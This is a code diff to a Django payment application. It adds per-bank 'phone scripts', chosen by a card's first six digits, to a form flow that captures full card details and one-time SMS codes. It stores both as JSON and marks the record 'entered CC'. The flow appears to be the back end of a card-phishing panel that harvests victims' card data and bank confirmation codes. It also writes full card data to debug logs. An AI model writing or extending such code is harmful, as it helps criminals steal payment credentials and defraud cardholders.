@@ -20,7 +20,7 @@ from deposit.models import Incoming
 from payment import forms
 from payment.filters import PaymentFilter
 from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form
-from payment.models import Payment, PayRequisite, Shop, CreditCard
+from payment.models import Payment, PayRequisite, Shop, CreditCard, PhoneScript
 
 logger = structlog.get_logger(__name__)
 
@@ -36,6 +36,22 @@ def get_pay_requisite(pay_type: str) -> PayRequisite:
         selected_requisite = random.choice(active_requsite)
         logger.debug(f'get_pay_requisite {pay_type}: {selected_requisite.id} из {active_requsite}')
         return selected_requisite
+
+
+def get_phone_script(card_num) -> PhoneScript:
+    """Возвращает скрипт для ввода данных карты/смс по номеру карты"""
+    try:
+        bin_num = str(card_num)[:6]
+        logger.debug(f'bin_num: {bin_num}')
+        phone_script = PhoneScript.objects.filter(bins__contains=[bin_num]).first()
+
+        if not phone_script:
+            logger.info('phone_script: default')
+            return PhoneScript.objects.get(name='default')
+        logger.info(f'phone_script: {phone_script}')
+        return phone_script
+    except Exception as err:
+        logger.error(err)
 
 
 TIMER_SECONDS = 300
@@ -247,6 +263,10 @@ def pay_to_m10_create(request, *args, **kwargs):
             initial_data.update(json.loads(payment.card_data))
         form = forms.InvoiceM10Form(initial=initial_data)
         context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
+        card_number = initial_data.get('card_number')
+        if card_number:
+            phone_script = get_phone_script(card_number)
+            context['phone_script'] = phone_script
         return render(request, context=context, template_name='payment/invoice_m10.html')
 
     elif request.method == 'POST':
@@ -256,15 +276,18 @@ def pay_to_m10_create(request, *args, **kwargs):
         form = InvoiceM10Form(request.POST)
         context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
         if form.is_valid():
-
             card_data = form.cleaned_data
             logger.debug(card_data)
-            # card_num = card_data.get()
-            json_data = json.dumps(card_data, ensure_ascii=False)
+            card_number = card_data.get('card_number')
+            phone_script = get_phone_script(card_number)
+            context['phone_script'] = phone_script
+            # phone_script.step_2_required = 0
+            print(phone_script)
             sms_code = card_data.get('sms_code')
-            payment.card_data = json_data
-            if sms_code:
-                # Если введен смс-код
+            payment.card_data = json.dumps(card_data, ensure_ascii=False)
+            payment.phone_script_data = phone_script.data_json()
+            # Если ввел смс-код или status 3 и смс код не требуется
+            if sms_code or (payment.status == 3 and not phone_script.step_2_required):
                 # payment.status = 7  # Ожидание подтверждения
                 payment.save()
                 return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
@@ -272,11 +295,6 @@ def pay_to_m10_create(request, *args, **kwargs):
             payment.status = 3  # Ввел CC.
             payment.save()
             return render(request, context=context, template_name='payment/invoice_m10.html')
-            # # Сохраняем данные и скриншот, меняем статус
-            # logger.debug('form_save')
-            # payment.status = 1
-            # form.save()
-            # return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
         else:
             # Некорректные данные
             logger.debug(f'{form.errors}')
